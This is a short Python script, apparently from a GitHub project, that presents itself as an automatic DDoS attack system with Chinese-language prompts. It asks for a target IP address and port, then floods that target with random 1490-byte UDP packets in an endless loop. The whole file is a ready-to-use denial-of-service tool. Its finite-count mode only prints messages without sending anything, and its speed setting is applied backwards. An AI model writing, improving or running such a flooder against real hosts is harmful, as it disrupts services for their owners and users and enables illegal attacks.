# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print ("github@Andysun06 by github@xiaoguansudio")
print("DDOS自动攻击系统")
print("谨慎使用，后果自负")
print("  ")
print("--------------------")
print("  ")
ip = input("请输入 IP : ")
port = int(input("攻击端口: "))
sd = int(input("攻击速度(1~10000)0为true: "))
cs = int(input("攻击次数（0为无尽,若大于0则上一参数无效）："))
os.system("clear")


sent = 0
i = 0
if cs > 0:
     for i in range(cs):
          sent = sent + 1
          print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
else:
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
          if sd < 0 :
               time.sleep((10000-sd)/2000)
          else:
               print("电脑随时爆炸，请注意安全")

